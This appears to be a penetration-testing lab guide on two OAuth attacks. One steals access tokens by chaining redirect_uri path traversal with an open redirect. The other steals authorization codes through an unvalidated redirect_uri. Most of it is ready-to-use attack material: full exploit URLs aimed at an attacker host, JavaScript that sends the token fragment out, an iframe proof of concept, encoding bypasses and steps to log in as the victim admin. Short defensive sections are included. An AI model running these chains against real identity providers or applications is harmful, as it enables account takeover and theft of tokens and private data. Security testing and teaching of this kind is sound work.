## Encounters

### Steal an OAuth token via redirect

Risk: Flawed `redirect_uri` validation combined with a client-side open redirect enables theft of OAuth access tokens (typically implicit flow: `response_type=token`). Tokens appear in the URL fragment and must be exfiltrated via JavaScript.

Assumptions
- Victim is authenticated at the OAuth provider (IdP) and will click links you send (exploit server or phishing).
- Client uses an allowlist for `redirect_uri` but performs weak validation (e.g., prefix/startsWith check), allowing path traversal or parameter smuggling.
- The client application contains an open redirect (e.g., `GET /post/next?path=...`).

High-level attack chain
1) Start OAuth flow at the IdP `/auth` endpoint.
2) Point `redirect_uri` to a same-origin path that you can pivot through (e.g., `.../oauth-callback/../post/next?path=`) so it passes the allowlist.
3) Use the open redirect to forward the browser to your exploit server.
4) IdP appends the access token as a URL fragment (`#access_token=...`).
5) Your exploit page reads the fragment and exfiltrates it (fragments aren’t sent to servers automatically).
6) Use the stolen token at the client’s API (for example, `GET /me` with `Authorization: Bearer <token>`) to retrieve sensitive data (e.g., admin API key).

Hunting methodology (repeatable)
1) Baseline the OAuth flow
   - Log in with test creds and proxy (Burp/ZAP). Capture: `GET /auth?client_id=...&redirect_uri=...&response_type=...` and the subsequent callback.
   - Send the client’s token-using API call (often `GET /me`) to Repeater for later token swap testing.

2) Probe `redirect_uri` validation
   - Try suffixing the allowlisted callback with benign characters or traversal:
     - `/oauth-callback/..`
     - `/oauth-callback/../post?postId=1`
     - Encoded variants: `%2e%2e/`, `..%2f`, `%2f..%2f`
   - If exact external domains are blocked, confirm that appended path segments still pass validation (classic prefix/startsWith bug).

3) Find a client-side open redirect
   - Crawl for endpoints like `/post/next?path=...`, `/redirect?url=...`, `/login?next=...`.
   - Verify absolute URL redirects: `https://attacker.example/exploit`. Also try protocol-relative `//attacker.example/` and encoded forms.

4) Chain the bugs
   - Build an IdP authorization URL that sets `redirect_uri` to a same-origin path-traversal into the open redirect, which forwards to your exploit page.

Example chain (replace placeholders):
```
https://{IDP_HOST}/auth?client_id={CLIENT_ID}&redirect_uri=https://{LAB_HOST}/oauth-callback/../post/next?path=https://{EXPLOIT_HOST}/exploit&response_type=token&nonce={RAND}&scope=openid%20profile%20email
```

5) Exfiltrate the fragment
   - On your exploit server at `/exploit`, use minimal JS to send the fragment somewhere observable (access logs, your endpoint):
```
<script>location='/?'+location.hash.slice(1)</script>
```
   - For one-click steals, auto-initiate OAuth if the hash is missing:
```
<script>
if (!location.hash) {
  location = 'https://{IDP_HOST}/auth?client_id={CLIENT_ID}&redirect_uri='+
    encodeURIComponent('https://{VICTIMSITE}/oauth-callback/../{OPENREDIRECTPATH}?path=https://{EXPLOIT_HOST}/exploit')+
    '&response_type=token&nonce={RAND}&scope=openid%20profile%20email';
} else {
  location = '/?'+location.hash.slice(1);
}
</script>
```

6) Use the token
   - In Repeater, swap `Authorization: Bearer <your-token>` with the stolen token on the client’s API (e.g., `GET /me`). Extract the target’s data (admin API key, profile, etc.).

Notes and pitfalls
- Fragments (`#...`) are not sent in HTTP requests; you must use JS to read and exfiltrate.
- Some IdPs enforce exact-match allowlists. Use encoded traversal (`%2e%2e/`) or parameter smuggling (`?next=`) if normalization is weak.
- If `response_mode=form_post` is enforced, pivot to form-catching endpoints or different bugs; this guide targets the implicit flow (`response_type=token`).
- `state` and `nonce` typically don’t prevent this token leak if the redirect target remains attacker-controlled via open redirect.

Defensive guidance
- Enforce exact `redirect_uri` allowlists (normalized, casefolded, trailing-slash-consistent). Never use prefix checks.
- Disallow `..`, mixed encodings, and double-encoding in allowlist comparisons; normalize before compare.
- Remove open redirects or strictly validate redirect targets to same-origin, static paths.
- Prefer Authorization Code + PKCE, issue tokens server-side, and avoid putting access tokens in fragments.
- Validate `state` binding to the correct `redirect_uri`. Consider CSP and no inline scripts on callback pages.

Reusable payloads and templates
- See `Oauth/wordlists/redirect_uri_bypasses.txt` for `redirect_uri` tricks.
- See `Oauth/wordlists/open_redirect_params_and_payloads.txt` for open-redirect hunting.
- See `Oauth/wordlists/combined_oauth_open_redirect_templates.txt` for full-chain URL templates.
- See `Oauth/wordlists/exfiltration_js_snippets.html` for copy-paste exfil snippets.

Burp workflow (quick)
- Intercept login → send IdP `/auth` and client `/me` to Repeater.
- Test `redirect_uri` suffix/traversal; verify you can land on arbitrary client paths.
- Find open redirect; confirm absolute URL redirect works.
- Chain to exploit server, observe `#access_token` in browser → exfil via JS.
- Reuse token on `/me` to retrieve sensitive data.

# Steal an OAuth authorization code via misconfigured redirect_uri

Risk: The IdP accepts arbitrary `redirect_uri` values (no strict allowlist), so `response_type=code` authorization responses are sent to attacker-controlled domains, leaking authorization codes. The attacker can then complete the client app login as the victim by supplying the stolen code to the client callback.

Assumptions
- Victim (admin) has an active IdP session and will open links from your exploit server.
- IdP does not strictly validate `redirect_uri` against a per-client allowlist.
- Client uses the Authorization Code flow and accepts a `code` on `oauth-callback` to finish login.

High-level attack chain
1) Trigger IdP `/auth` with `response_type=code` using the victim’s client_id.
2) Set `redirect_uri` to your exploit server (external domain).
3) IdP redirects to your server with `?code=...` in the query string.
4) Use the stolen `code` on the client’s callback endpoint to complete login as the victim.

Hunting methodology (repeatable)
1) Baseline the code flow
   - Log in normally while proxying. Identify `GET /auth?client_id=...&redirect_uri=...&response_type=code` and the subsequent redirect to the client with `?code=...`.
   - Confirm that re-login with an active IdP session is immediate (SSO) so the authorization request proceeds without prompts.

2) Test `redirect_uri` acceptance at the IdP
   - Send the latest `GET /auth?...` to Repeater.
   - Replace `redirect_uri` with your exploit server origin, e.g., `https://{EXPLOIT_HOST}`. If the response issues a redirect to your domain containing `?code=...`, the IdP is misconfigured.

3) Build and host the exploit
   - Minimal PoC using an iframe at `/exploit` on your exploit server:
```
<iframe src="https://{IDP_HOST}/auth?client_id={CLIENT_ID}&redirect_uri=https://{EXPLOIT_HOST}&response_type=code&scope=openid%20profile%20email"></iframe>
```
   - Store and view the exploit; verify your access log contains a request with `?code=...`.

4) Steal the victim’s code
   - Deliver the exploit to the victim. Monitor the exploit server access log and copy the resulting `code`.

5) Complete login as the victim
   - Log out of the client app to clear your session.
   - Visit the client callback directly with the stolen code:
```
https://{VICTIMSITE}/oauth-callback?code={STOLEN_CODE}
```
   - The client should finish the flow and log you in as the victim (admin). Proceed to privileged actions (e.g., delete `carlos`).

Notes and pitfalls
- No fragment exfiltration is required here; authorization codes are in the query string and reach your server and logs directly.
- If the IdP prompts for consent or login, ensure the victim has an active IdP session to avoid user friction.
- If `state` is present, some clients validate it only on their own callback; the IdP misconfig still leaks `code` to your domain. You still need to send the `code` to the client’s callback URL.
- Codes are typically short-lived and single-use; act promptly after capture.

Defensive guidance
- Enforce exact-match, normalized `redirect_uri` allowlists per `client_id` on the IdP.
- Validate `state` and bind it to the initiating session and expected `redirect_uri`.
- Prefer Authorization Code + PKCE and require client authentication (or dynamic client registration constraints) at the token endpoint.
- Monitor for external-domain `redirect_uri` usage and block requests that do not match registered URIs.

Burp workflow (quick)
- Intercept login → identify `GET /auth?client_id=...&response_type=code`.
- In Repeater, change `redirect_uri` to your exploit domain and follow the redirect.
- Confirm `?code=...` appears in your exploit server logs.
- Deliver a stored iframe exploit to the victim; capture `code`.
- Use `https://{VICTIMSITE}/oauth-callback?code={STOLEN_CODE}` to assume the victim session.